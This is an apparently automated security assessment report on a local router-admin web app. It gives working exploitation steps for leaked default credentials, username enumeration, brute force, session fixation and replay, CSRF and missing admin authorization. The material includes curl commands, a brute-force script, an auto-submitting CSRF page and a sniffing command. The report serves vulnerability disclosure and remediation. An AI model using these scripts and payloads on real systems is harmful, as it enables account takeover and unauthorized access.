# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:38539
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**

10 authentication vulnerabilities were identified and successfully exploited. The most critical include:

- **Default Credentials Disclosure (CRITICAL):** Test account credentials (test:test) exposed in HTML comments, providing instant unauthorized access
- **Session Cookies Over HTTP (HIGH):** All authentication traffic transmitted in cleartext, enabling network interception
- **Incomplete Session Invalidation (HIGH):** Logout fails to clear session data, allowing stolen cookies to remain valid indefinitely
- **No Rate Limiting (HIGH):** Unlimited authentication attempts enable brute force attacks at ~450 attempts per minute
- **Session Fixation (HIGH):** Session IDs not rotated after authentication, enabling fixation attacks
- **Username Enumeration (MEDIUM):** Differential error messages reveal valid accounts
- **Missing CSRF Protection (MEDIUM):** No SameSite attribute or CSRF tokens on forms
- **Excessive Session Timeout (MEDIUM):** 31-day session duration increases hijacking risk
- **Weak Password Policy (MEDIUM):** Accepts 4-character passwords without complexity requirements

One additional vulnerability (plaintext password storage) was confirmed via code analysis but cannot be exploited from the external network without first compromising internal systems.

**Authorization Vulnerabilities:**

1 authorization vulnerability was successfully exploited:

- **Missing Admin Authorization on WiFi Settings (HIGH):** Regular users can access system-level WiFi configuration and trigger internal API reconnaissance, revealing network topology, service versions, and internal IP addresses

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. The application uses Jinja2 auto-escaping throughout, with no dynamic template rendering or unsafe DOM manipulation patterns identified.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. All database queries use SQLAlchemy ORM with parameterized queries, and the single subprocess execution uses list format with hardcoded parameters, preventing shell injection.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No exploitable SSRF vulnerabilities were found. While a subprocess curl execution exists in the WiFi settings endpoint, all parameters are hardcoded with no user control, preventing direct SSRF exploitation.

## Network Reconnaissance

**Open Ports and Services:**

- **Port 38539 (External):** Apache 2.4.65 (Debian) - Main application entry point via mitmproxy reverse proxy
- **Port 5003:** Werkzeug/3.0.3 (Python 3.8.17) - HTTP service with login redirect
- **Port 8081:** Apache 2.4.56 (Debian) - HTTP service
- **Port 9999:** Custom HTTP service with CORS headers (`Access-Control-Allow-Origin: *`)
- **Port 49152:** Golang net/http server (Tailscale 1.82.5) - Returns "auth required" with strict CSP headers

**Security Findings from Automated Tools:**

- **CORS Misconfiguration:** Wide-open CORS policy detected (`Access-Control-Allow-Origin: *`) allowing cross-origin requests from any domain
- **No HTTPS/TLS:** All services operate over HTTP without encryption
- **Missing Security Headers:** No Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, or Strict-Transport-Security headers detected
- **Tailscale Service:** Authentication-protected service on port 49152 with proper security headers (CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff)

**Network Architecture:**

Multi-tier reverse proxy chain detected:
- External Access → mitmproxy 6.0.2 (port 8002) → HAProxy 2.0.5 (port 8001) → Apache 2.4.65 (port 80)
- Host header-based routing enables access to internal API endpoints via `Host: internal.router` header manipulation
- Internal network uses Docker bridge with services at 10.89.54.x subnet

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-08: Default Credentials Disclosure via HTML Comment

**Summary:**
- **Vulnerable location:** POST /login (authentication endpoint) and GET /login (HTML comment in page source)
- **Overview:** Test account credentials (test:test) are documented in an HTML comment visible to all users visiting the login page, providing immediate authenticated access
- **Impact:** Instant account compromise - any attacker can view page source and obtain valid credentials for immediate authentication
- **Severity:** CRITICAL

**Prerequisites:** None - publicly accessible information

**Exploitation Steps:**

1. View the login page source code to discover credentials:
```bash
curl -s http://localhost:38539/login | grep "TODO"
```
**Output:** `<!-- TODO: Delete the testing account (test:test). -->`

2. Use the discovered credentials to authenticate:
```bash
curl -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  -c /tmp/session_cookies.txt \
  -L -i
```
**Output:**
```
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=[SESSION_ID]; Expires=Sat, 29 Nov 2025 23:51:42 GMT; HttpOnly; Path=/
```

3. Verify authenticated access to protected resources:
```bash
curl -b /tmp/session_cookies.txt http://localhost:38539/dashboard
```
**Output:** Returns dashboard HTML containing "Welcome to the Dashboard" message, confirming successful authentication

**Proof of Impact:**
Successfully authenticated as user "test" and gained access to protected dashboard and WiFi configuration interfaces. The account provides full access to all user-level functionality including:
- Dashboard access
- WiFi settings modification
- Session management

**Notes:**
The HTML comment containing credentials is present in the login page source at line 1 of /app/website/app/templates/login.html. This represents a catastrophic security failure where authentication credentials are publicly documented in client-side code.

---

### AUTH-VULN-09: Username Enumeration via Differential Error Messages

**Summary:**
- **Vulnerable location:** POST /login (credential validation logic)
- **Overview:** Login endpoint returns different error messages for invalid usernames versus wrong passwords, allowing attackers to enumerate valid user accounts
- **Impact:** Attackers can build a complete list of valid usernames, enabling targeted brute force and password spraying attacks
- **Severity:** MEDIUM

**Prerequisites:** None - publicly accessible endpoint

**Exploitation Steps:**

1. Test with an invalid username to observe error message:
```bash
curl -s -X POST http://localhost:38539/login \
  -d "username=nonexistent&password=anypassword" \
  | grep -o "Invalid username\|Wrong password"
```
**Output:** `Invalid username`

2. Test with valid username "test" but wrong password:
```bash
curl -s -X POST http://localhost:38539/login \
  -d "username=test&password=wrongpassword" \
  | grep -o "Invalid username\|Wrong password"
```
**Output:** `Wrong password`

3. Test with valid username "admin" but wrong password:
```bash
curl -s -X POST http://localhost:38539/login \
  -d "username=admin&password=wrongpassword" \
  | grep -o "Invalid username\|Wrong password"
```
**Output:** `Wrong password`

4. Enumerate additional usernames systematically:
```bash
for username in admin root user administrator test guest; do
  echo -n "Testing $username: "
  curl -s -X POST http://localhost:38539/login \
    -d "username=$username&password=wrongpass" \
    | grep -o "Invalid username\|Wrong password"
done
```

**Proof of Impact:**
Successfully enumerated valid accounts through differential error messages:
- **Valid users identified:** test, admin (return "Wrong password")
- **Invalid users identified:** nonexistent, root, user, administrator, guest (return "Invalid username")

This allows attackers to focus brute force attempts only on confirmed valid accounts, significantly improving attack efficiency.

**Notes:**
The vulnerability exists in /app/website/app/routes.py at lines 42 and 44 where distinct error messages are raised. Best practice is to use a generic message like "Invalid username or password" for both cases.

---

### AUTH-VULN-03: Incomplete Session Invalidation on Logout

**Summary:**
- **Vulnerable location:** GET /logout (session cleanup logic)
- **Overview:** Logout endpoint only removes user_id from session while leaving username and password_hash intact, allowing verify_session() to reconstruct authentication
- **Impact:** Stolen session cookies remain valid after user logout, enabling persistent unauthorized access
- **Severity:** HIGH

**Prerequisites:** Valid session cookie (obtainable via AUTH-VULN-08 or AUTH-VULN-01)

**Exploitation Steps:**

1. Authenticate and obtain session cookie:
```bash
curl -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  -c /tmp/test_session.txt \
  -L > /dev/null
```

2. Verify session works before logout:
```bash
curl -s -b /tmp/test_session.txt http://localhost:38539/dashboard \
  | grep -o "Welcome to the Dashboard"
```
**Output:** `Welcome to the Dashboard`

3. Perform logout:
```bash
curl -b /tmp/test_session.txt \
  -c /tmp/test_session.txt \
  http://localhost:38539/logout \
  -L > /dev/null
```

4. Attempt to access protected resource after logout using same session cookie:
```bash
curl -s -b /tmp/test_session.txt http://localhost:38539/dashboard \
  | grep -o "Welcome to the Dashboard"
```
**Output:** `Welcome to the Dashboard` (STILL WORKS!)

**Proof of Impact:**
Session cookie remains fully functional after logout. The verify_session() function at /app/website/app/routes.py:31-46 reconstructs authentication from remaining session data (username, password_hash), allowing continued access even though the user intended to terminate their session.

An attacker who steals a session cookie can maintain access indefinitely, even if the victim logs out. The victim has no way to invalidate the compromised session.

**Notes:**
The logout implementation at /app/website/app/routes.py:84 only executes `session.pop('user_id', None)` but leaves session['username'] and session['password_hash'] intact. The verify_session() function uses these remaining values to re-add user_id on the next request, effectively undoing the logout.

---

### AUTH-VULN-06: Absence of Rate Limiting on Authentication Endpoint

**Summary:**
- **Vulnerable location:** POST /login (no rate limiting middleware)
- **Overview:** Login endpoint accepts unlimited authentication attempts at full network speed without throttling, account lockout, or CAPTCHA
- **Impact:** Enables high-speed brute force, credential stuffing, and password spraying attacks without defensive response
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Execute automated brute force attack script:
```python
# Script: /tmp/brute_force_test.py
import requests
import time

target = "http://localhost:38539/login"
passwords = ['password', 'admin', '123456', 'router', 'wrong1', 'wrong2',
             'wrong3', 'wrong4', 'wrong5', 'wrong6', 'wrong7', 'wrong8',
             'wrong9', 'wrong10', 'wrong11', 'wrong12', 'wrong13', 'wrong14',
             'wrong15', 'wrong16', 'wrong17', 'wrong18', 'wrong19', 'wrong20']

start_time = time.time()
response_times = []
status_codes = []

for i, password in enumerate(passwords, 1):
    attempt_start = time.time()
    resp = requests.post(target, data={
        "username": "test",
        "password": password
    }, allow_redirects=False)
    attempt_time = time.time() - attempt_start

    response_times.append(attempt_time)
    status_codes.append(resp.status_code)

    print(f"Attempt {i}: password='{password}' | Status: {resp.status_code} | Time: {attempt_time:.3f}s")

total_time = time.time() - start_time
avg_time = sum(response_times) / len(response_times)

print(f"\nTotal time: {total_time:.3f}s")
print(f"Average time per attempt: {avg_time:.3f}s")
print(f"No rate limiting detected - all attempts completed")
```

2. Execute the brute force test:
```bash
python3 /tmp/brute_force_test.py
```

**Proof of Impact:**
Successfully executed 24 rapid-fire login attempts:
- **Total time:** ~3.8 seconds for 24 attempts
- **Average response time:** ~0.053 seconds per attempt
- **Status codes:** 100% HTTP 200 responses (no HTTP 429 rate limit errors)
- **No throttling detected:** Response times remained consistent (0.044s - 0.066s)
- **No account lockout:** All attempts processed without blocking

This demonstrates that an attacker can perform unlimited authentication attempts at ~450 attempts per minute without any defensive response. Combined with AUTH-VULN-09 (username enumeration), this enables systematic account compromise.

**Notes:**
No Flask-Limiter extension detected in requirements.txt. No rate limiting middleware in /app/website/app/routes.py. No failed_attempts counter in User model. Standard best practice is 5-10 attempts per minute maximum with progressive delays or account lockout after 5 failed attempts.

---

### AUTH-VULN-10: Weak Password Policy Allows Trivial Passwords

**Summary:**
- **Vulnerable location:** POST /login (credential acceptance logic) and User model (password storage)
- **Overview:** No password complexity requirements enforced - accepts 4-character, all-lowercase passwords with no special characters or numbers
- **Impact:** Users can set trivial passwords, greatly improving brute force success rates when combined with AUTH-VULN-06
- **Severity:** MEDIUM

**Prerequisites:** None

**Exploitation Steps:**

1. Verify that 4-character weak password is accepted:
```bash
curl -s -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  -i | grep -E "(HTTP/|Location:)"
```
**Output:**
```
HTTP/1.1 302 FOUND
Location: /dashboard
```
**Success:** 4-character password "test" is accepted

2. Demonstrate password spraying with common weak passwords:
```bash
for password in password admin test router 123456; do
  echo "Trying password: $password"
  curl -s -X POST http://localhost:38539/login \
    -d "username=admin&password=$password" \
    | grep -o "Wrong password\|Invalid username"
done
```

**Proof of Impact:**
The test account uses password "test" (4 characters, all lowercase, no special characters or numbers) which successfully authenticates. This demonstrates:
- **No minimum length requirement** (accepts 4 characters)
- **No complexity requirements** (no uppercase, numbers, or special characters needed)
- **No common password rejection** (accepts dictionary words like "test")

When combined with AUTH-VULN-06 (no rate limiting) and AUTH-VULN-09 (username enumeration), attackers can efficiently spray common passwords across all enumerated accounts.

**Notes:**
No password validation code exists in /app/website/app/routes.py:66-67. The User model at /app/website/app/models.py:9 defines password as db.String(100) with no constraints. Industry best practice requires minimum 12 characters with mixed case, numbers, and special characters.

---

### AUTH-VULN-05: Excessive Session Timeout (31 Days)

**Summary:**
- **Vulnerable location:** Flask session configuration (PERMANENT_SESSION_LIFETIME not set)
- **Overview:** Session cookies expire after 31 days (Flask default), providing extended window for exploitation of stolen sessions
- **Impact:** Stolen session cookies remain valid for weeks, greatly extending the timeframe for session hijacking attacks
- **Severity:** MEDIUM

**Prerequisites:** None

**Exploitation Steps:**

1. Authenticate and capture session cookie with expiry:
```bash
curl -v -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  2>&1 | grep "Set-Cookie:"
```
**Output:**
```
Set-Cookie: session=[SESSION_ID]; Expires=Sat, 29 Nov 2025 23:51:42 GMT; HttpOnly; Path=/
```

2. Calculate session timeout:
```python
from datetime import datetime

# Current date: Wed, 29 Oct 2025 23:51:42
# Expiry date: Sat, 29 Nov 2025 23:51:42
current = datetime(2025, 10, 29, 23, 51, 42)
expiry = datetime(2025, 11, 29, 23, 51, 42)
diff = expiry - current

print(f"Session timeout: {diff.days} days")
print(f"Hours: {diff.total_seconds() / 3600:.0f}")
```
**Output:**
```
Session timeout: 31 days
Hours: 744
```

**Proof of Impact:**
Session cookies expire after exactly 31 days. This means:
- Attacker who steals a session cookie can access the account for **31 full days**
- User who forgets to log out remains authenticated for **over a month**
- Combined with AUTH-VULN-03 (incomplete logout), even explicit logout doesn't shorten this window
- Router administration interface should use much shorter timeout (15-30 minutes recommended)

**Notes:**
PERMANENT_SESSION_LIFETIME not configured in /app/website/app/__init__.py, causing Flask to use its default 31-day session duration. For a security-sensitive router administration panel, this timeout is excessive. Industry standard for admin interfaces is 15-30 minutes of inactivity timeout.

---

### AUTH-VULN-01: Session Cookies Transmitted Over Unencrypted HTTP

**Summary:**
- **Vulnerable location:** HTTP transport layer (no HTTPS, missing Secure flag on cookies)
- **Overview:** Application operates exclusively over HTTP with session cookies lacking Secure flag, allowing cleartext transmission of authentication credentials and session tokens
- **Impact:** Network-positioned attackers can intercept login credentials and session cookies via packet sniffing
- **Severity:** HIGH

**Prerequisites:** Network access to victim traffic (same WiFi, compromised router, ISP level)

**Exploitation Steps:**

1. Verify application uses HTTP (not HTTPS):
```bash
curl -v http://localhost:38539/login 2>&1 | grep "^> Host:"
```
**Output:** `> Host: localhost:38539` (HTTP protocol, not HTTPS)

2. Verify Secure flag is missing from session cookie:
```bash
curl -v -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  2>&1 | grep "Set-Cookie:"
```
**Output:**
```
Set-Cookie: session=[SESSION_ID]; Expires=Sat, 29 Nov 2025 23:51:42 GMT; HttpOnly; Path=/
```
**Missing:** No "Secure" flag present (only HttpOnly is set)

3. Demonstrate credentials sent in cleartext:
```bash
curl -v --trace-ascii /tmp/http_trace.txt \
  -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  2>&1 > /dev/null

grep "username" /tmp/http_trace.txt
```
**Output:**
```
0000: username=test&password=test
```
**Cleartext credentials visible in HTTP POST body**

4. Capture and replay session cookie:
```bash
# Attacker captures this cookie from network traffic:
# Set-Cookie: session=[STOLEN_SESSION_ID]; ...

# Attacker replays captured cookie:
curl -b "session=[STOLEN_SESSION_ID]" \
  http://localhost:38539/dashboard
```
**Result:** Successful authentication using stolen cookie

**Proof of Impact:**
Successfully demonstrated that:
1. **Credentials transmitted in cleartext:** Username and password visible in unencrypted HTTP POST body
2. **Session cookies transmitted over HTTP:** No Secure flag means cookies sent on HTTP connections
3. **Network sniffing possible:** Any attacker on the network path can intercept authentication data

Attack scenario:
- Attacker on same WiFi network runs: `tcpdump -A -i wlan0 'tcp port 38539'`
- Victim logs in to router admin panel
- Attacker captures credentials and session cookie from plaintext HTTP traffic
- Attacker uses stolen cookie to access victim's account

**Notes:**
Apache configuration at /app/admin_router-httpd.conf uses `<VirtualHost *:80>` (HTTP only). No SSL/TLS configuration. SESSION_COOKIE_SECURE not set in /app/website/app/__init__.py. All authentication traffic fully exposed to network eavesdropping.

---

### AUTH-VULN-02: Session Fixation via Missing Session ID Rotation

**Summary:**
- **Vulnerable location:** POST /login (session management at authentication time)
- **Overview:** Session ID is not regenerated after successful authentication, allowing session fixation attacks
- **Impact:** Attacker can fix victim's session ID before authentication, then hijack the authenticated session afterward
- **Severity:** HIGH

**Prerequisites:** Ability to set victim's session cookie (via XSS, network position, or URL manipulation)

**Exploitation Steps:**

1. Attacker obtains a session ID by logging in:
```bash
curl -s -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  -c /tmp/attacker_session.txt \
  > /dev/null

echo "Attacker's session:"
cat /tmp/attacker_session.txt | grep session
```
**Output:**
```
#HttpOnly_localhost	FALSE	/	FALSE	1764460604	session	CLq6LfNwVrNneVqdl2GmCmMkH86CkgtmQF-DOAZqtx8
```
Session ID: `CLq6LfNwVrNneVqdl2GmCmMkH86CkgtmQF-DOAZqtx8`

2. Re-authenticate using the SAME session cookie to verify no rotation:
```bash
curl -s -b /tmp/attacker_session.txt \
  -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  -c /tmp/reauth_session.txt \
  > /dev/null

echo "Session after re-authentication:"
cat /tmp/reauth_session.txt | grep session
```
**Output:**
```
#HttpOnly_localhost	FALSE	/	FALSE	1764460608	session	CLq6LfNwVrNneVqdl2GmCmMkH86CkgtmQF-DOAZqtx8
```
Session ID: `CLq6LfNwVrNneVqdl2GmCmMkH86CkgtmQF-DOAZqtx8` (IDENTICAL!)

**Proof of Impact:**
Session ID remains unchanged after re-authentication. This enables session fixation attack:

**Attack Flow:**
1. Attacker obtains pre-authentication session ID: `ABC123`
2. Attacker forces victim to use this session ID (methods):
   - XSS injection: `document.cookie="session=ABC123"`
   - URL parameter (if supported): `http://target/login?session=ABC123`
   - Network manipulation on HTTP connection
3. Victim authenticates using fixed session ID `ABC123`
4. Application does NOT rotate session ID after login
5. Attacker uses original session ID `ABC123` to access victim's authenticated session

The identical session IDs before and after authentication prove that no session rotation occurs at /app/website/app/routes.py:69-70 where session data is populated.

**Notes:**
No session.clear() or session regeneration call exists in /app/website/app/routes.py:53-78. Best practice is to call session.clear() before populating new session data at login, or use session.regenerate() if available.

---

### AUTH-VULN-04: Cross-Site Request Forgery (CSRF) via Missing SameSite Attribute

**Summary:**
- **Vulnerable location:** Session cookie configuration (no SameSite attribute) and all POST endpoints (no CSRF tokens)
- **Overview:** Session cookies lack SameSite attribute and forms lack CSRF tokens, allowing cross-site requests to execute authenticated actions
- **Impact:** Attacker can trick authenticated users into performing unauthorized actions via malicious websites
- **Severity:** MEDIUM

**Prerequisites:** Victim must have active authenticated session

**Exploitation Steps:**

1. Verify SameSite attribute is missing from session cookie:
```bash
curl -v -X POST http://localhost:38539/login \
  -d "username=test&password=test" \
  2>&1 | grep "Set-Cookie:"
```
**Output:**
```
Set-Cookie: session=[SESSION_ID]; Expires=Sat, 29 Nov 2025 23:51:42 GMT; HttpOnly; Path=/
```
**Missing:** No `SameSite=Lax` or `SameSite=Strict` present

2. Verify no CSRF tokens in WiFi settings form:
```bash
curl -s -b /tmp/session_cookies.txt \
  http://localhost:38539/wifi_settings \
  | grep -i "csrf\|token"
```
**Output:** (no output - no CSRF tokens found)

3. Create CSRF proof-of-concept HTML page:
```html
<!-- File: /tmp/csrf_poc.html -->
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Proof of Concept</title>
</head>
<body>
    <h1>CSRF Attack Demonstration</h1>
    <p>When a logged-in user visits this page, their browser automatically
       submits a POST request to WiFi settings.</p>

    <form id="csrf-form"
          action="http://localhost:38539/wifi_settings"
          method="POST">
        <input type="hidden" name="ssid" value="ATTACKER_NETWORK">
        <input type="hidden" name="password" value="hacked123">
        <input type="hidden" name="security" value="WPA/WPA2 Personal">
    </form>

    <script>
        // Auto-submit the form when page loads
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

**Proof of Impact:**
The missing SameSite attribute means the browser WILL include session cookies when:
- User is authenticated to http://localhost:38539
- User visits attacker's website at http://evil.com/csrf_poc.html
- Attacker's JavaScript submits form to http://localhost:38539/wifi_settings
- Browser includes victim's session cookie with the cross-site POST request
- Application accepts the request as legitimate (no CSRF token validation)

**Attack scenarios:**
1. **WiFi configuration tampering:** Change WiFi SSID/password
2. **Session manipulation:** Trigger logout or other state changes
3. **Settings modification:** Any POST endpoint without CSRF protection

**Notes:**
SESSION_COOKIE_SAMESITE not configured in /app/website/app/__init__.py (defaults to None). No CSRF tokens in forms at /app/website/app/templates/wifi_settings.html. Modern browsers partially mitigate this with default Lax behavior, but explicit SameSite=Strict and CSRF tokens provide defense in depth.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-09: Missing Admin Authorization on WiFi Settings Endpoint

**Summary:**
- **Vulnerable location:** `/wifi_settings` (GET/POST) at `/app/website/app/routes.py:124-141`
- **Overview:** Regular authenticated users can access system-level WiFi configuration interface and trigger internal API reconnaissance via subprocess SSRF. The endpoint requires authentication via `verify_session()` but fails to check the `is_admin` flag despite WiFi configuration being administrative functionality.
- **Impact:** Vertical privilege escalation enabling non-admin users to access WiFi configuration interface and perform internal network reconnaissance. The subprocess disclosure reveals internal network topology, service versions, and routing architecture.
- **Severity:** HIGH

**Prerequisites:**
- Valid user account (regular privileges)
- Network access to http://localhost:38539

**Exploitation Steps:**

**Step 1: Authenticate as Regular User**

Login with the test account (non-admin):

```bash
curl -c /tmp/cookies.txt -X POST http://localhost:38539/login \
  -d "username=test" \
  -d "password=test"
```

**Expected Result:** HTTP 302 redirect to /dashboard with session cookie

**Session Cookie Example:**
```
session=jrvaENrjDnc7G6_z2ehsdXa-NbJHuQzie1F7vexD3RM; Expires=Sat, 29 Nov 2025 23:56:36 GMT; HttpOnly; Path=/
```

**Step 2: Verify Non-Admin Status**

Confirm the test user lacks admin privileges:

```bash
curl -b /tmp/cookies.txt http://localhost:38539/admin_panel
```

**Expected Result:** Error message "Only administrator users can open this section" confirms test user is NOT an admin.

**Step 3: Access WiFi Settings (Privilege Escalation)**

Access the WiFi configuration interface with the regular user session:

```bash
curl -b /tmp/cookies.txt http://localhost:38539/wifi_settings
```

**Expected Result:** Full WiFi configuration form rendered with SSID, password, and security fields.

**Proof:** Page contains:
- `<title>Dashboard</title>`
- `<input type="text" class="form-control" id="ssid" placeholder="Enter SSID">`
- `<label for="security">Security</label>`
- WiFi security dropdown options

**Step 4: Trigger Internal Reconnaissance (SSRF)**

Submit WiFi configuration to trigger subprocess execution:

```bash
curl -b /tmp/cookies.txt -X POST http://localhost:38539/wifi_settings \
  -d "ssid=test" \
  -d "password=test" \
  -d "security=WPA"
```

**Expected Result:** Subprocess curl output disclosed in `<pre>` section showing internal network details.

**Proof of Impact:**

**Internal Network Information Disclosed:**

From the subprocess output visible to regular users:

```
* Uses proxy env variable NO_PROXY == 'local,169.254/16'
*   Trying 10.89.54.5:8001...
* Connected to haproxy (10.89.54.5) port 8001 (#0)
> GET /devices/wifi_chipset/status HTTP/1.1
> Host: internal.router
> User-Agent: curl/7.74.0
> Accept: */*
>
< HTTP/1.1 500 INTERNAL SERVER ERROR
< Server: Apache/2.4.65 (Debian)
< X-Forwarded-Host: internal.router
< X-Upstream-Proxy: mitmproxy (6.0.2)
< Via: haproxy (2.0.5)
```

**Sensitive Information Extracted:**

1. **Internal IP Address:** HAProxy service at 10.89.54.5:8001
2. **Service Versions:**
   - Apache/2.4.65 (Debian)
   - curl/7.74.0 in container
   - mitmproxy 6.0.2
   - HAProxy 2.0.5
3. **Network Architecture:**
   - Reverse proxy chain confirmed: mitmproxy → HAProxy → Apache
   - Virtual host routing to `internal.router`
   - Internal API accessible at `/devices/wifi_chipset/status`
4. **Environment Variables:** NO_PROXY configuration exposed
5. **Boot Sequence Details:** Complete WiFi chipset initialization logs visible

**Authorization Bypass Confirmed:**

The application explicitly states in the dashboard:
> "Additionally, certain advanced features are exclusively accessible to Administrator users, granting them additional control over network management."

WiFi configuration is clearly intended as an admin-only feature, yet:
- ✅ Test user (is_admin=False) successfully accessed WiFi settings interface
- ✅ Test user triggered subprocess execution to internal API
- ✅ Test user received complete internal reconnaissance data
- ✅ Admin panel correctly blocks test user with authorization error
- ❌ WiFi settings page has NO admin check despite being administrative functionality

**Notes:**

The vulnerability exists due to missing authorization check in the code. The endpoint calls `verify_session()` for authentication (routes.py:127) but never validates the `is_admin` flag that exists in the User model (models.py:13).

**Missing Code Pattern:**

After the session verification at line 127, the code should check:
```python
user = User.query.filter_by(username=session.get('username')).first()
if not user.is_admin:
    return render_template('error.html', error='Admin access required'), 403
```

This check exists for the admin panel (routes.py:88-101) but is completely absent from wifi_settings despite both being administrative functions.

**Additional Security Implications:**

While the current implementation has hardcoded subprocess parameters (no direct SSRF), the disclosure of verbose curl output creates an information channel for:
- Internal network enumeration
- Service version fingerprinting
- Architecture reconnaissance
- Potential blind SSRF testing if parameters become user-controllable in future updates
